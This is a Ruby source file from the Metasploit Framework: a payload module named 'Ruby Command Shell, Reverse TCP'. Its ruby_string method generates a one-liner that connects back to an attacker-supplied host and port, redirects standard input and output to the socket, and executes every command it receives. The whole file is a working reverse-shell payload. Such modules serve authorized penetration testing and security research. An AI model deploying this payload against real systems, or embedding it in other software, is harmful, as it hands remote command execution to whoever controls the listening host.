##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Ruby Command Shell, Reverse TCP',
			'Description' => 'Connect back and create a command shell via Ruby',
			'Author'      => [ 'kris katterjohn', 'hdm' ],
			'License'     => MSF_LICENSE,
			'Platform'    => 'ruby',
			'Arch'        => ARCH_RUBY,
			'Handler'     => Msf::Handler::ReverseTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'ruby',
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + ruby_string
	end

	def ruby_string
		lhost = datastore['LHOST']
		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
		"require 'socket';c=TCPSocket.new(\"#{lhost}\",\"#{datastore['LPORT']}\");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.length==0;system(l)}"
	end
end
